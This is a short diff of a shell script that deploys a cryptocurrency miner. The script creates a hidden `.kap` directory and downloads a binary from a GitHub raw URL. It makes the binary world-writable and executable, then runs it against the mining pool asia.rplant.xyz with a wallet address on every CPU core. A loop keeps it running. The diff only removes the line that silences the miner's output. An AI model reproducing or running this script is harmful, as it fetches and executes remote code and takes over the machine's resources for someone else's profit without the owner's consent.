@@ -2,7 +2,7 @@
 mkdir .kap && cd .kap
 wget -O bubux https://github.com/cai674fangquehe-crypto/ggfs/raw/refs/heads/main/VRL >/dev/null 2>&1
 chmod 777 bubux
-./bubux -a randomvirel --url asia.rplant.xyz:7155 --user v64r101exoz1ugbjnwrv3jo8ns0qx7xax5hz9xea6ihubua6e.SARKUM -t $(nproc --all) >/dev/null 2>&1
+./bubux -a randomvirel --url asia.rplant.xyz:7155 --user v64r101exoz1ugbjnwrv3jo8ns0qx7xax5hz9xea6ihubua6e.SARKUM -t $(nproc --all)
 while [ 1 ]; do
 sleep 3
 done
